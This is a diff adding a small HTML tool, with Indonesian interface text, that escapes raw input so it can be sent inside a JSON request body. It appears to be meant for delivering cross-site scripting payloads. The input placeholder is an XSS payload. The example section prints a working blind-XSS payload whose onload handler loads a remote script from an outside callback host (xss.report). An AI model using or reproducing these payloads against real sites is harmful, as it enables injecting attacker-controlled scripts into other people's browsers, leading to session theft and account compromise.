@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>JSON Body Value Escaper</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-slate-950 text-slate-100 min-h-screen flex items-center justify-center">
+
+  <div class="w-full max-w-4xl p-6">
+    <h1 class="text-3xl font-bold mb-2">JSON Body Value Escaper</h1>
+    <p class="text-slate-400 mb-6">
+      Tool untuk mengkoreksi / escape value agar aman dikirim sebagai <b>JSON body request</b>.
+    </p>
+
+    <div class="grid md:grid-cols-2 gap-4">
+      <div>
+        <label class="block mb-2 text-sm">Input (raw value)</label>
+        <textarea id="input" class="w-full h-48 p-3 rounded-xl bg-slate-900 border border-slate-700 focus:outline-none focus:ring-2 focus:ring-indigo-500" placeholder='"><<svg onload="alert(1)">'></textarea>
+      </div>
+
+      <div>
+        <label class="block mb-2 text-sm">Output (JSON-safe)</label>
+        <textarea id="output" readonly class="w-full h-48 p-3 rounded-xl bg-slate-900 border border-slate-700"></textarea>
+      </div>
+    </div>
+
+    <div class="flex flex-wrap gap-3 mt-4">
+      <button onclick="escapeValue()" class="px-5 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-500 transition">
+        Escape
+      </button>
+      <button onclick="copyOutput()" class="px-5 py-2 rounded-xl bg-slate-700 hover:bg-slate-600 transition">
+        Copy Output
+      </button>
+      <button onclick="clearAll()" class="px-5 py-2 rounded-xl bg-red-600 hover:bg-red-500 transition">
+        Clear
+      </button>
+    </div>
+
+    <div class="mt-8 bg-slate-900 border border-slate-800 rounded-xl p-4 text-sm text-slate-300">
+      <p class="font-semibold mb-2">Contoh:</p>
+      <pre class="text-slate-400 whitespace-pre-wrap">Input:
+"><<svg onload="var a=document.createElement('script');a.src='https://xss.report/c/l';document.body.appendChild(a)">
+
+Output:
+\"><<svg onload=\\\"var a=document.createElement('script');a.src='https://xss.report/c/l';document.body.appendChild(a)\\\"></pre>
+    </div>
+  </div>
+
+  <script>
+    function escapeValue() {
+      const input = document.getElementById('input').value;
+      const escaped = JSON.stringify(input).slice(1, -1);
+      document.getElementById('output').value = escaped;
+    }
+
+    function copyOutput() {
+      const out = document.getElementById('output');
+      out.select();
+      document.execCommand('copy');
+    }
+
+    function clearAll() {
+      document.getElementById('input').value = '';
+      document.getElementById('output').value = '';
+    }
+  </script>
+
+</body>
+</html>
